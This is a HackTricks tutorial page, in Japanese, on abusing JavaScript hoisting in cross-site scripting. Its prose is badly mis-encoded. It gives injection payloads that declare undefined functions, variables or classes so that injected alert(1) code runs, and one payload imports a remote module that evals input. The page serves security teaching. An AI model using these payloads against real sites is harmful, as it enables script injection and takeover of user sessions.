# JS Hoisting

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## åŸºæœ¬æƒ…å ±

JavaScriptè¨€èªã§ã¯ã€å¤‰æ•°ã€é–¢æ•°ã€ã‚¯ãƒ©ã‚¹ã€ã¾ãŸã¯ã‚¤ãƒ³ãƒãƒ¼ãƒˆã®å®£è¨€ãŒã‚³ãƒ¼ãƒ‰ãŒå®Ÿè¡Œã•ã‚Œã‚‹å‰ã«ãã®ã‚¹ã‚³ãƒ¼ãƒ—ã®å…ˆé ­ã«æ¦‚å¿µçš„ã«æŒã¡ä¸Šã’ã‚‰ã‚Œã‚‹ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã§ã‚ã‚‹**ãƒ›ã‚¤ã‚¹ãƒ†ã‚£ãƒ³ã‚°**ãŒèª¬æ˜ã•ã‚Œã¦ã„ã¾ã™ã€‚ã“ã®ãƒ—ãƒ­ã‚»ã‚¹ã¯ã€JavaScriptã‚¨ãƒ³ã‚¸ãƒ³ã«ã‚ˆã£ã¦è‡ªå‹•çš„ã«å®Ÿè¡Œã•ã‚Œã€ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’è¤‡æ•°å›é€šéã—ã¾ã™ã€‚

æœ€åˆã®ãƒ‘ã‚¹ã§ã¯ã€ã‚¨ãƒ³ã‚¸ãƒ³ã¯ã‚³ãƒ¼ãƒ‰ã‚’è§£æã—ã¦æ§‹æ–‡ã‚¨ãƒ©ãƒ¼ã‚’ãƒã‚§ãƒƒã‚¯ã—ã€æŠ½è±¡æ§‹æ–‡æœ¨ã«å¤‰æ›ã—ã¾ã™ã€‚ã“ã®ãƒ•ã‚§ãƒ¼ã‚ºã«ã¯ãƒ›ã‚¤ã‚¹ãƒ†ã‚£ãƒ³ã‚°ãŒå«ã¾ã‚Œã€ç‰¹å®šã®å®£è¨€ãŒå®Ÿè¡Œã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã®å…ˆé ­ã«ç§»å‹•ã•ã‚Œã¾ã™ã€‚è§£æãƒ•ã‚§ãƒ¼ã‚ºãŒæˆåŠŸã™ã‚‹ã¨ã€æ§‹æ–‡ã‚¨ãƒ©ãƒ¼ãŒãªã„ã“ã¨ã‚’ç¤ºã—ã€ã‚¹ã‚¯ãƒªãƒ—ãƒˆã®å®Ÿè¡ŒãŒé€²è¡Œã—ã¾ã™ã€‚

ç†è§£ã™ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ï¼š

1. ã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯å®Ÿè¡Œã•ã‚Œã‚‹ãŸã‚ã«æ§‹æ–‡ã‚¨ãƒ©ãƒ¼ãŒãªã„å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚æ§‹æ–‡ãƒ«ãƒ¼ãƒ«ã¯å³å¯†ã«éµå®ˆã•ã‚Œãªã‘ã‚Œã°ãªã‚Šã¾ã›ã‚“ã€‚
2. ã‚¹ã‚¯ãƒªãƒ—ãƒˆå†…ã®ã‚³ãƒ¼ãƒ‰ã®é…ç½®ã¯ãƒ›ã‚¤ã‚¹ãƒ†ã‚£ãƒ³ã‚°ã®ãŸã‚ã«å®Ÿè¡Œã«å½±éŸ¿ã‚’ä¸ãˆã¾ã™ãŒã€å®Ÿè¡Œã•ã‚Œã‚‹ã‚³ãƒ¼ãƒ‰ã¯ãã®ãƒ†ã‚­ã‚¹ãƒˆè¡¨ç¾ã¨ã¯ç•°ãªã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚

#### ãƒ›ã‚¤ã‚¹ãƒ†ã‚£ãƒ³ã‚°ã®ç¨®é¡

MDNã®æƒ…å ±ã«åŸºã¥ãã¨ã€JavaScriptã«ã¯4ã¤ã®ç•°ãªã‚‹ãƒ›ã‚¤ã‚¹ãƒ†ã‚£ãƒ³ã‚°ã®ç¨®é¡ãŒã‚ã‚Šã¾ã™ï¼š

1. **å€¤ã®ãƒ›ã‚¤ã‚¹ãƒ†ã‚£ãƒ³ã‚°**ï¼šå®£è¨€è¡Œã®å‰ã«ãã®ã‚¹ã‚³ãƒ¼ãƒ—å†…ã§å¤‰æ•°ã®å€¤ã‚’ä½¿ç”¨ã§ãã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚
2. **å®£è¨€ã®ãƒ›ã‚¤ã‚¹ãƒ†ã‚£ãƒ³ã‚°**ï¼šå®£è¨€ã®å‰ã«ãã®ã‚¹ã‚³ãƒ¼ãƒ—å†…ã§å¤‰æ•°ã‚’å‚ç…§ã§ãã‚‹ã‚ˆã†ã«ã—ã¾ã™ãŒã€å¤‰æ•°ã®å€¤ã¯`undefined`ã«ãªã‚Šã¾ã™ã€‚
3. ã“ã®ã‚¿ã‚¤ãƒ—ã¯ã€å®Ÿéš›ã®å®£è¨€è¡Œã®å‰ã«å¤‰æ•°ãŒå®£è¨€ã•ã‚Œã‚‹ãŸã‚ã€ãã®ã‚¹ã‚³ãƒ¼ãƒ—å†…ã®å‹•ä½œã‚’å¤‰æ›´ã—ã¾ã™ã€‚
4. å®£è¨€ã®å‰¯ä½œç”¨ã¯ã€ãã‚Œã‚’å«ã‚€ä»–ã®ã‚³ãƒ¼ãƒ‰ãŒè©•ä¾¡ã•ã‚Œã‚‹å‰ã«ç™ºç”Ÿã—ã¾ã™ã€‚

è©³ç´°ã«ã¯ã€é–¢æ•°å®£è¨€ã¯ã‚¿ã‚¤ãƒ—1ã®ãƒ›ã‚¤ã‚¹ãƒ†ã‚£ãƒ³ã‚°å‹•ä½œã‚’ç¤ºã—ã¾ã™ã€‚`var`ã‚­ãƒ¼ãƒ¯ãƒ¼ãƒ‰ã¯ã‚¿ã‚¤ãƒ—2ã®å‹•ä½œã‚’ç¤ºã—ã¾ã™ã€‚`let`ã€`const`ã€ãŠã‚ˆã³`class`ã‚’å«ã‚€ãƒ¬ã‚­ã‚·ã‚«ãƒ«å®£è¨€ã¯ã‚¿ã‚¤ãƒ—3ã®å‹•ä½œã‚’ç¤ºã—ã¾ã™ã€‚æœ€å¾Œã«ã€`import`æ–‡ã¯ã€ã‚¿ã‚¤ãƒ—1ã¨ã‚¿ã‚¤ãƒ—4ã®ä¸¡æ–¹ã®å‹•ä½œã§ãƒ›ã‚¤ã‚¹ãƒ†ã‚£ãƒ³ã‚°ã•ã‚Œã‚‹ç‚¹ã§ãƒ¦ãƒ‹ãƒ¼ã‚¯ã§ã™ã€‚

## ã‚·ãƒŠãƒªã‚ª

ã—ãŸãŒã£ã¦ã€**æœªå®£è¨€ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆ**ãŒä½¿ç”¨ã•ã‚ŒãŸå¾Œã«**JSã‚³ãƒ¼ãƒ‰ã‚’æ³¨å…¥ã§ãã‚‹**ã‚·ãƒŠãƒªã‚ªãŒã‚ã‚‹å ´åˆã€å®£è¨€ã™ã‚‹ã“ã¨ã§**æ§‹æ–‡ã‚’ä¿®æ­£**ã§ãã‚‹ãŸã‚ï¼ˆã‚¨ãƒ©ãƒ¼ã‚’æŠ•ã’ã‚‹ã®ã§ã¯ãªãã€ã‚ãªãŸã®ã‚³ãƒ¼ãƒ‰ãŒå®Ÿè¡Œã•ã‚Œã‚‹ã‚ˆã†ã«ï¼‰ï¼š
```javascript
// The function vulnerableFunction is not defined
vulnerableFunction('test', '<INJECTION>');
// You can define it in your injection to execute JS
//Payload1: param='-alert(1)-'')%3b+function+vulnerableFunction(a,b){return+1}%3b
'-alert(1)-''); function vulnerableFunction(a,b){return 1};

//Payload2: param=test')%3bfunction+vulnerableFunction(a,b){return+1}%3balert(1)
test'); function vulnerableFunction(a,b){ return 1 };alert(1)
```

```javascript
// If a variable is not defined, you could define it in the injection
// In the following example var a is not defined
function myFunction(a,b){
return 1
};
myFunction(a, '<INJECTION>')

//Payload: param=test')%3b+var+a+%3d+1%3b+alert(1)%3b
test'); var a = 1; alert(1);
```

```javascript
// If an undeclared class is used, you cannot declare it AFTER being used
var variable = new unexploitableClass();
<INJECTION>
// But you can actually declare it as a function, being able to fix the syntax with something like:
function unexploitableClass() {
return 1;
}
alert(1);
```

```javascript
// Properties are not hoisted
// So the following examples where the 'cookie' attribute doesnÂ´t exist
// cannot be fixed if you can only inject after that code:
test.cookie('leo','INJECTION')
test['cookie','injection']
```
## ã•ã‚‰ãªã‚‹ã‚·ãƒŠãƒªã‚ª
```javascript
// Undeclared var accessing to an undeclared method
x.y(1,INJECTION)
// You can inject
alert(1));function x(){}//
// And execute the allert with (the alert is resolved before it's detected that the "y" is undefined
x.y(1,alert(1));function x(){}//)
```

```javascript
// Undeclared var accessing 2 nested undeclared method
x.y.z(1,INJECTION)
// You can inject
");import {x} from "https://example.com/module.js"//
// It will be executed
x.y.z("alert(1)");import {x} from "https://example.com/module.js"//")


// The imported module:
// module.js
var x = {
y: {
z: function(param) {
eval(param);
}
}
};

export { x };
```

```javascript
// In this final scenario from https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/
// It was injected the: let config;`-alert(1)`//`
// With the goal of making in the block the var config be empty, so the return is not executed
// And the same injection was replicated in the body URL to execute an alert

try {
if(config){
return;
}
// TODO handle missing config for: https://try-to-catch.glitch.me/"+`
let config;`-alert(1)`//`+"
} catch {
fetch("/error", {
method: "POST",
body: {
url:"https://try-to-catch.glitch.me/"+`
let config;`-alert(1)-`//`+""
}
})
}
```
## å‚è€ƒæ–‡çŒ®

* [https://jlajara.gitlab.io/Javascript\_Hoisting\_in\_XSS\_Scenarios](https://jlajara.gitlab.io/Javascript\_Hoisting\_in\_XSS\_Scenarios)
* [https://developer.mozilla.org/en-US/docs/Glossary/Hoisting](https://developer.mozilla.org/en-US/docs/Glossary/Hoisting)
* [https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/](https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/)

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
